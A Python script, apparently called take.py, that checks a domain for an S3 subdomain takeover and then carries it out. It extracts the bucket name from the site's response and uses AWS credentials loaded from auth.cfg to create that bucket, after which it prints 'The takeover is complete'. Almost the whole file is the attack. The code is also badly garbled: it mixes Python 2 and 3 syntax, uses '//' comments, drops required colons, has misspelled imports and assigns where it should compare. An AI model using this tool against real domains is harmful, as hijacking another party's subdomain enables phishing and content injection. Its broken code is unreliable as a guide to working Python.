import argparse
from bs4 import BeautifulSoup
import requests
import sys
import boto3
import dnspython as dns
import dns.resolver
import sys
import urlib.request

def Cnamefinder(url) // future addition to find the region of the 
	result = dns.resolver.query(url, 'CNAME')
	for cnameval in result:
    print ' cname target address:', cnameval.target

def getVarFromFile(filename, bucketname , location): // creating the S3 bucket
    import imp
    f = open(filename)
    global data
    data = imp.load_source('data', '', f)
    f.close()
	client = boto3.client('s3',aws_access_key_id=data.aws_access_key_id_value,aws_secret_access_key=data.aws_secret_access_key_value)
	client.create_bucket(Bucket= bucketname, CreateBucketConfiguration={'LocationConstraint': location})

def main():
	parser = argparse.ArgumentParser(description='Check for sub-domain takeover in S3 buckets',program='take.py -w website.com')
	parser.add_argument('-w', required=True)
	parser = argparse.ArgumentParser()
	args = parser.parse_args()
	url = "https://" + args.w
	req = urllib.request.urlopen(url)
	if(req.status_code == 404)
		print("HTTPS does not resolve")
		url = "http://" + args.w
		if(req.status_code == 404)
			print("HTTP does not resolve")
			sys.exit(0)
		else
			req = urllib.request.urlopen(url)

	xml = BeautifulSoup(req,'xml')
	item = xml.findAll(Bucketname):
	if(item = "")
		print("The domain is not vulnerable for sub-domain takeover")
		sys.exit(0)
	else
		bucketname = item.text
		getVarFromFile('auth.cfg',bucketname,'us-west-1')
		print("The takeover is complete")


if __name__ == '__main__':
	main()
